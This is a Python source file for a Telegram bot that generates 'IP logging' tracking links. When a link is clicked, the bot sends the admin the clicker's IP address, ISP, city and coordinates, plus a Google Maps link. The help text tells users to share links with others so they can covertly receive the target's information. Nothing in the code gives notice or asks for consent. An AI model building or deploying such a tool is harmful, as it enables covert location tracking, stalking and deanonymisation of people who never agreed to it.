import os
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters
import aiohttp
import json

load_dotenv()  # Load environment variables

BOT_TOKEN = os.getenv('BOT_TOKEN')
BASE_URL = os.getenv('BASE_URL')
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID', '0'))  # Get admin ID from environment variable

async def start(update: Update, context: CallbackContext) -> None:
    """Send welcome message when /start is issued."""
    welcome_msg = (
        "👋 Welcome! I can help you create IP logging links.\n\n"
        "Commands:\n"
        "/generate - Generate a new tracking link\n"
        "/help - Show this help message"
    )
    await update.message.reply_text(welcome_msg)

async def generate_link(update: Update, context: CallbackContext) -> None:
    """Generate a tracking link."""
    try:
        # Generate a unique identifier for this tracking link
        tracking_id = str(abs(hash(str(update.effective_user.id) + str(update.message.message_id))))
        
        # Create the tracking link
        tracking_link = f"{BASE_URL}/track/{tracking_id}"
        
        # Create inline keyboard with the link
        keyboard = [[InlineKeyboardButton("Share Link", url=tracking_link)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "✅ Here's your tracking link:\n\n"
            f"`{tracking_link}`\n\n"
            "When someone clicks this link, I'll send you their information.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error generating link: {e}")
        await update.message.reply_text("❌ Error generating link. Please try again.")

async def handle_tracking_data(tracking_id: str, ip_data: dict, bot) -> None:
    """Handle the tracking data received from the API."""
    try:
        # Check if there was an error getting IP data
        if "error" in ip_data:
            error_msg = (
                "⚠️ Error getting IP information:\n"
                f"`{ip_data.get('error', 'Unknown error')}`"
            )
            if ADMIN_USER_ID != 0:
                await bot.send_message(chat_id=ADMIN_USER_ID, text=error_msg, parse_mode='Markdown')
            return

        # Format the received data
        info = (
            "🎯 New click detected!\n\n"
            f"📍 IP Address: `{ip_data.get('ip', 'Unknown')}`\n"
            f"🌍 Country: {ip_data.get('country', 'Unknown')}\n"
            f"🏢 City: {ip_data.get('city', 'Unknown')}\n"
            f"🌐 Region: {ip_data.get('region', 'Unknown')}\n"
            f"⏰ Timezone: {ip_data.get('timezone', 'Unknown')}\n"
            f"🔌 ISP: {ip_data.get('isp', 'Unknown')}\n"
            f"🏢 Organization: {ip_data.get('org', 'Unknown')}\n"
            f"🌐 AS: {ip_data.get('as', 'Unknown')}\n"
            f"📍 Location: {ip_data.get('latitude', 'Unknown')}, {ip_data.get('longitude', 'Unknown')}\n"
        )
        
        # Add Google Maps link if coordinates are available
        if ip_data.get('latitude') and ip_data.get('longitude'):
            maps_link = f"https://www.google.com/maps?q={ip_data['latitude']},{ip_data['longitude']}"
            info += f"\n🗺 [View on Google Maps]({maps_link})"
        
        # Send the information to admin
        if ADMIN_USER_ID != 0:
            await bot.send_message(chat_id=ADMIN_USER_ID, text=info, parse_mode='Markdown', disable_web_page_preview=True)
    except Exception as e:
        print(f"Error handling tracking data: {e}")
        error_msg = f"⚠️ Error processing tracking data: {str(e)}"
        if ADMIN_USER_ID != 0:
            await bot.send_message(chat_id=ADMIN_USER_ID, text=error_msg)

async def help_command(update: Update, context: CallbackContext) -> None:
    """Send help message."""
    help_text = (
        "🤖 Bot Commands:\n\n"
        "/generate - Create a new tracking link\n"
        "/help - Show this help message\n\n"
        "ℹ️ How to use:\n"
        "1. Use /generate to create a tracking link\n"
        "2. Share the link with someone\n"
        "3. When they click it, you'll receive their information"
    )
    await update.message.reply_text(help_text)

def main() -> None:
    """Start the bot."""
    try:
        # Create the Application
        application = Application.builder().token(BOT_TOKEN).build()

        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("generate", generate_link))

        # Start the bot
        print("Starting bot...")
        application.run_polling()
    except Exception as e:
        print(f"Error starting bot: {e}")

if __name__ == '__main__':
    main() 